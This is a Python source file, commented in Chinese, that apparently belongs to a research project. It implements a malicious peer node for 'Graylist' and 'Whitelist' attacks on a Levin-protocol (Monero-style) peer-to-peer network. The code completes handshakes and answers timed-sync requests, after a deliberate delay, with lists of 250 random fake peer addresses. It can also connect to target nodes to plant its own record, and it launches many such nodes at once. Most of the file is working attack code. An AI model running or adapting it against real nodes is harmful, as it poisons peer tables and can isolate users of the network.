import socket
import select
import time
import random
import threading
import fcntl
import os
from typing import cast

import levin
import levin.constants
import constants
import tools

# 这个是节点类，将攻击所需要的恶意节点进行抽象，Graylist attack和Whitelist attack都只需要调用节点类的方法即可实现。
class Node:
    # 初始化
    def __init__(self, bind_ip: str, bind_port: int, delay_of_resp: int) -> None:
        """
            my_port: 恶意节点监听的端口号,
            delay_of_resp: 恶意节点对目标节点的请求进行响应时的延迟时间(主要是对timed sync请求的响应延迟)
        """
        self.bind_ip = bind_ip
        self.bind_port = bind_port
        self.peer_id = random.getrandbits(64)
        self.delay_of_resp = delay_of_resp
        self.server_socket = None
        self.client_socket = None
        self.socket_map = {}
        
        self.epoll = None
        
        # 记录已经建立的传入连接和传出连接
        self.incoming_connections = {}  # 传入连接的文件描述符: 记录节点当前的传入连接
        self.outgoing_connections = {}  # 传出连接的文件描述符: 我们主动连接的良性节点
        
        # 锁，实现对变量的互斥访问
        self.lock = threading.Lock()
        
        self.stop_event = threading.Event()
        
    
    # def set_nonblocking(self, sock: socket.socket):
    #     """将套接字设计成非阻塞IO"""
    #     # 获取当前文件描述符
    #     flags = fcntl.fcntl(sock, fcntl.F_GETFL)
    #     # 设置非阻塞标志
    #     fcntl.fcntl(sock, fcntl.F_SETFL, flags | os.O_NONBLOCK)
        
        
    def start_server(self):
        """创建资源"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # 直接监听本地的相应端口。如果之后要用IP地址池的Proxy服务的话，后续在做相关功能的兼容
        self.server_socket.bind((self.bind_ip, self.bind_port))
        self.server_socket.listen(5)
        self.log("Waiting for incoming connections...")
        
        # 创建epoll对象
        self.epoll = select.epoll()
        # 注册监听 socket
        with self.lock:
            self.epoll.register(self.server_socket.fileno(), select.EPOLLIN)
            self.socket_map[self.server_socket.fileno()] = self.server_socket
        
    
    def stop_server(self):
        """ 清理资源 """
        with self.lock:
            for fileno in self.socket_map:
                self.epoll.unregister(fileno)
                self.socket_map[fileno].close()
            self.epoll.close()
    
    
    def stop(self):
        self.stop_event.set()
    
    
    def run(self):
        """
        主程序, 启动服务器并管理连接
        """
        self.start_server()
        
        while not self.stop_event.is_set():
            try: 
                # 使用 epoll I/O多路复用的方式进行套接字事件管理
                events = self.epoll.poll(1)
                
                for fileno, event in events:
                    if fileno == self.server_socket.fileno():
                        # 接收新的tcp传入连接请求
                        client_socket, client_address = self.server_socket.accept()
                        self.log(f"New tcp connection from {client_address}")
                        if client_socket is not None:
                            with self.lock:
                                self.epoll.register(client_socket.fileno(), select.EPOLLIN) # 注册客户端socket
                                self.socket_map[client_socket.fileno()] = client_socket
                        else:
                            self.log(f"Failed to accept client socket from remote peer {client_address}.")
                    else:
                        # 处理来自现有连接的数据
                        self.handle_connection(fileno)
            except KeyboardInterrupt:
                self.log("Node stopped.")
                break
            except Exception as e:
                self.log(f"Error: {e}")
                break
        
        self.stop_server()
        

    def handle_connection(self, socket_fileno):
        """
        处理接收到的数据
        :param socket_fileno: 触发事件的socket的文件描述符
        """
        with self.lock:
            socket_obj = cast(socket.socket, self.socket_map[socket_fileno])
        try:
            buffer = socket_obj.recv(8)
            if not buffer: 
                self.log(f"Connection closed by the remote peer {socket_obj.getpeername()}")
                if socket_obj is not None:
                    with self.lock:
                        self.epoll.unregister(socket_obj.fileno())
                        del self.socket_map[socket_obj.fileno()]
                        if socket_obj.fileno() in self.incoming_connections:
                            del self.incoming_connections[socket_obj.fileno()]
                        if socket_obj.fileno() in self.outgoing_connections:
                            del self.outgoing_connections[socket_obj.fileno()]
                    socket_obj.close()
                return
            if not buffer.startswith(bytes(levin.constants.LEVIN_SIGNATURE)):
                self.log(f"Receive error levin message from remote peer {socket_obj.getpeername()}")
                if socket_obj is not None:
                    with self.lock:
                        self.epoll.unregister(socket_obj.fileno())
                        del self.socket_map[socket_obj.fileno()]
                        if socket_obj.fileno() in self.incoming_connections:
                            del self.incoming_connections[socket_obj.fileno()]
                        if socket_obj.fileno() in self.outgoing_connections:
                            del self.outgoing_connections[socket_obj.fileno()]
                    socket_obj.close()
                return
            bucket = levin.Bucket.from_buffer(signature=buffer, sock=socket_obj)
            if bucket == None:
                self.log(f"Receive error levin message from remote peer {socket_obj.getpeername()}")
                if socket_obj is not None:
                    with self.lock:
                        self.epoll.unregister(socket_obj.fileno())
                        del self.socket_map[socket_obj.fileno()]
                        if socket_obj.fileno() in self.incoming_connections:
                            del self.incoming_connections[socket_obj.fileno()]
                        if socket_obj.fileno() in self.outgoing_connections:
                            del self.outgoing_connections[socket_obj.fileno()]
                    socket_obj.close()
                return
            if bucket.flags == levin.constants.LEVIN_PACKET_REQUEST:
                if bucket.command == 1001:
                    bucket = levin.Bucket.create_handshake_response(
                        my_port=self.bind_port,
                        network_id=constants.network_id,
                        peer_id=self.peer_id
                    )
                    socket_obj.send(bucket.header() + bucket.payload())
                    return
                if bucket.command == 1002:
                    peerlist = tools.generate_random_ip_list(250)
                    bucket = levin.Bucket.create_timed_sync_response(
                        my_port=self.bind_port,
                        network_id=constants.network_id,
                        peer_id=self.peer_id,
                        malicious_peerlist=peerlist
                    )
                    time.sleep(self.delay_of_resp)
                    socket_obj.send(bucket.header() + bucket.payload())
                    self.log(f"Send timed sync response to remote peer {socket_obj.getpeername()}.")
                    return
                if bucket.command == 1003:
                    bucket = levin.Bucket.create_ping_response(
                        peer_id=self.peer_id
                    )
                    socket_obj.send(bucket.header() + bucket.payload())
                    return
                if bucket.command == 2002:
                    # self.log(f"Receive new tx from remote peer {socket_obj.getpeername()}")
                    return
                if bucket.command == 2008:
                    # self.log(f"Receive new block from remote peer {socket_obj.getpeername()}")
                    return
                else:
                    self.log(f"Receive request message from remote peer {socket_obj.getpeername()}, message type: {bucket.command}")

            else:   # 是响应消息
                if bucket.command == 1001:
                    self.log(f"Receive handshake response from remote peer {socket_obj.getpeername()}")
                    # 成功握手，将对应的传出连接socket加入到自己的outgoing connection中
                    self.outgoing_connections[socket_obj.fileno()] = socket_obj
                    return
                if bucket.command == 1002:
                    self.log(f"Recevie timed sync response from remote peer {socket_obj.getpeername()}")
                    # 成功定时同步
                    return
                if bucket.command == 1003:
                    self.log(f"Receive pong message from remote peer {socket_obj.getpeername()}")
                    # 收到来自节点的pong消息，完成了可连接性的验证
                    return
        except BlockingIOError:
            # 非阻塞情况(套接字没有数据)
            return
        except Exception as e:
            self.log(f"Error when handle message from remote peer {socket_obj.getpeername()}: {e}")
            if socket_obj is not None:
                with self.lock:
                    self.epoll.unregister(socket_obj.fileno())
                    del self.socket_map[socket_obj.fileno()]
                    if socket_obj.fileno() in self.incoming_connections:
                        del self.incoming_connections[socket_obj.fileno()]
                    if socket_obj.fileno() in self.outgoing_connections:
                        del self.outgoing_connections[socket_obj.fileno()]
                socket_obj.close()
            return
    
    
    def connect_to(self, target_ip: str, target_port: int, drop_after_connect: bool = False) -> bool:
        """
        主动连接到目标节点
        :param target_ip: 目标节点IP地址
        :param target_port: 目标节点端口
        :param drop_after_connect: 是否在完成连接后断开连接
        :return 连接成功 True 或失败 False
        """
        try:
            client_socket = socket.socket()
            client_socket.connect((target_ip, target_port))
            self.log(f"Connected to remote peer {target_ip}:{target_port}.")
            # 先不注册client_socket到epoll中，先等这个连接建立上再说
            bucket = levin.Bucket.create_handshake_request(
                my_port=self.bind_port,
                network_id=constants.network_id,
                peer_id=self.peer_id
            )
            client_socket.send(bucket.header() + bucket.payload())
            buffer = client_socket.recv(8)
            if not buffer:
                self.log(f"Handshake connection closed by the remote peer {client_socket.getpeername()}")
                client_socket.close()
                return False
            if not buffer.startswith(bytes(levin.constants.LEVIN_SIGNATURE)):
                self.log(f"Receive error levin message from remote peer {client_socket.getpeername()}")
                client_socket.close()
                return False
            bucket = levin.Bucket.from_buffer(signature=buffer, sock=client_socket)
            if bucket == None:
                self.log(f"Receive error levin message from remote peer {client_socket.getpeername()}")
                client_socket.close()
                return False
            if bucket.flags == levin.constants.LEVIN_PACKET_RESPONSE and bucket.command == 1001:
                # 收到了握手响应，说明此时连接已经成功建立了
                self.log(f"Receive handshake response from remote peer {client_socket.getpeername()}")
            else:
                self.log(f"Not Expected message from remote peer {client_socket.getpeername()}, message type {bucket.flags}.")
                client_socket.close()
                return False
            if drop_after_connect: # 短连接，只把自己的节点记录注入目标节点
                client_socket.close()
            else:   # 长连接
                with self.lock:
                    # 注册socket到epoll
                    self.epoll.register(client_socket.fileno(), select.EPOLLIN)
                    # 将目标连接保存起来
                    self.socket_map[client_socket.fileno()] = client_socket
                    self.outgoing_connections[client_socket.fileno()] = client_socket
            return True
        except Exception as e:
            self.log(f"Failed to connect to remote peer {target_ip}:{target_port}: {e}")
            if client_socket:
                with self.lock:
                    self.epoll.unregister(client_socket.fileno())
                    if client_socket.fileno() in self.outgoing_connections:
                        del self.outgoing_connections[client_socket.fileno()]
                client_socket.close()
            return False
    
    def log(self, *args, **kwargs):
        """节点日志记录"""
        current_time = tools.generate_current_time()
        message = f"[{current_time}] - [{self.bind_ip}:{self.bind_port}] " + " ".join(map(str, args))
        print(message, **kwargs)


def run_node(node_num: int) -> list:
    """
    启动若干节点
    :param node_num: 要启动的节点数量
    :return: 返回已经启动的节点列表
    """
    node_list = []
    start_port = 58080
    if node_num + start_port > 65535:
        print("node num too big!")
        return None
    for port in range(start_port, start_port + node_num):
        if is_port_in_use(port):
            continue
        node = Node(
            bind_ip="0.0.0.0", 
            bind_port=port,
            delay_of_resp=5
        )
        node_thread = threading.Thread(target=node.run, args=())
        node_thread.start()
        node_list.append(node)
    return node_list


def is_port_in_use(port: int) -> bool:
    """
    检查指定IP和端口是否被占用。
    :param port: 要检查的端口号
    :return: 如果端口被占用则返回True, 否则返回False
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("0.0.0.0", port))
            return False
        except OSError:
            return True